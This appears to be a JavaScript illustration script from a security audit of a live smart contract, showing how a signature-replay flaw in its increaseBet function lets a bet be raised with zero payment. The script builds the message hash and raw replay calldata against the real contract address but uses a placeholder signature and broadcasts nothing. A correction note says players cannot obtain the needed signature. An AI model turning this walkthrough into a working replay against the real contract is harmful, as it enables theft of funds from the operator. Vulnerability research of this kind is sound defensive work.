/**
 * F01 — increaseBet() free inflation via signature replay
 * "Attacker's-eye view" — what the raw call actually looks like, bypassing the UI entirely.
 *
 * ============================================================================
 * THIS SCRIPT DOES NOT SEND ANYTHING. It has no private key, no signer, and never
 * calls provider.sendTransaction / contract.increaseBet(...) as a state-changing call.
 * It only shows how the pieces fit together: how the message hash is built, what a
 * valid admin signature would need to cover, and what the raw calldata for the replay
 * would look like. The actual, executed proof (on a local zkEVM fork of the real
 * contract, never mainnet) lives in:
 *   TARGETS/deathfun/fork-test/test/F01_IncreaseBetFreeInflationAndReplay.t.sol
 * This file exists so the mechanism is readable without needing to trust or set up
 * that whole Foundry/zksolc toolchain — read this to understand it, run that to see
 * it actually happen on a disposable copy.
 * ============================================================================
 */

const { ethers } = require("ethers"); // npm install ethers  (v6)

// ---- Real, live values -----------------------------------------------------
const CONTRACT_ADDRESS = "0x27EDd16eE56958fddCBA08947f12C43DDeC2B20C"; // DeathFun proxy, Abstract
const MESSAGE_PREFIX = "DeathFun"; // read live from the contract's messagePrefix()

// The ABI fragment for the one function this finding is about
const ABI = [
  "function increaseBet(uint256 onChainGameId, uint256 amount, uint256 deadline, bytes calldata serverSignature) external payable",
];

/**
 * Reproduces DeathFun.sol's exact hash construction for increaseBet (L354-361):
 *
 *   bytes32 messageHash = keccak256(
 *       abi.encode(
 *           string.concat(messagePrefix, ":increaseBet"),
 *           onChainGameId,
 *           amount,
 *           deadline
 *       )
 *   );
 *
 * Notice what's NOT in this list: msg.value. That's the entire bug in one omission -
 * whoever holds a valid signature for this hash can call the function with any
 * msg.value they like (including 0), because nothing here ties the payment to the note.
 */
function buildIncreaseBetMessageHash(onChainGameId, amount, deadline) {
  const abiCoder = ethers.AbiCoder.defaultAbiCoder();
  const encoded = abiCoder.encode(
    ["string", "uint256", "uint256", "uint256"],
    [`${MESSAGE_PREFIX}:increaseBet`, onChainGameId, amount, deadline]
  );
  return ethers.keccak256(encoded);
}

/**
 * The contract's _verifyAnyAdminSignature (L456-463) does:
 *   bytes32 prefixedHash = ECDSA.toEthSignedMessageHash(_hash);
 *   address recoveredSigner = ECDSA.recover(prefixedHash, _signature);
 * i.e. standard personal_sign / eth_sign formatting. This is the digest an admin's
 * private key actually signs - we don't have that key, so we can't produce a
 * signature that would pass on the live contract. This function just shows what
 * the digest looks like.
 */
function toEthSignedMessageHash(hash) {
  return ethers.hashMessage(ethers.getBytes(hash));
}

// ---- Illustration: a legitimate note the backend might issue --------------
// (Numbers are illustrative. In a real interaction, `amount` is whatever a genuine
// "increase bet" request asked for - the backend signs exactly this, expecting the
// player to send this much ETH.)
//
// ⚠️ CORRECTION (2026-09-10): this script originally said the note is "obtained
// completely normally, through one real 'increase bet' request" by the player.
// Further analysis of the live client bundle shows that is NOT true - the browser
// never receives or handles a serverSignature (every occurrence in the shipped JS
// sits inside an ABI definition; the only createGame call-site is a dummy-argument
// gas estimate), and the session-key grant names the SERVER's wallet as signer. The
// backend builds, signs and submits the call. So the precondition illustrated below
// is not reachable by a player. The fork PoC reaches it by installing its OWN test
// key into the isAdmin mapping with vm.store (see fork-test/test/...t.sol L30, L46-48).
// This remains a correct demonstration of what the CONTRACT permits given a valid
// signature; it is not evidence that an external party can obtain one.
const onChainGameId = 12345n;      // some real, active game the attacker owns
const amount = ethers.parseEther("5"); // what the backend intended you to pay
const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour, backend's choice

const messageHash = buildIncreaseBetMessageHash(onChainGameId, amount, deadline);
const ethSignedHash = toEthSignedMessageHash(messageHash);

console.log("onChainGameId:", onChainGameId.toString());
console.log("amount (wei): ", amount.toString(), "=", ethers.formatEther(amount), "ETH");
console.log("deadline:     ", deadline, new Date(deadline * 1000).toISOString());
console.log("messageHash:  ", messageHash);
console.log("digest an admin key must sign:", ethSignedHash);
console.log();
console.log("--- The bug, in the shape of a raw call ---");
console.log("Given ONE valid `serverSignature` over the fields above, this is the ONLY");
console.log("this is the ONLY call needed to exploit it - repeated as many times as");
console.log("wanted before `deadline`. NOTE: no player-reachable path to obtaining that");
console.log("signature was found - see the correction note in the header.");
console.log();

const iface = new ethers.Interface(ABI);
// `serverSignature` below is a 65-byte PLACEHOLDER (all zero) purely to show the
// calldata SHAPE - a zero signature fails _verifyAnyAdminSignature and reverts.
// We do not have, and are not attempting to obtain, a real admin signature.
const placeholderSignature = "0x" + "00".repeat(65);
const calldata = iface.encodeFunctionData("increaseBet", [
  onChainGameId,
  amount,
  deadline,
  placeholderSignature,
]);

console.log("to:       ", CONTRACT_ADDRESS);
console.log("value:     0                          <-- the whole bug: this is 0, not `amount`");
console.log("data:     ", calldata);
console.log();
console.log("Send that same (to, 0, data) triple again, and again, before `deadline`");
console.log("passes - each time, game.betAmount increases by `amount`, for free.");
console.log();
console.log("NOT EXECUTED. No provider connected, no signer used, nothing broadcast.");
console.log("Real proof (fork-only, never mainnet): see the Foundry test referenced above.");
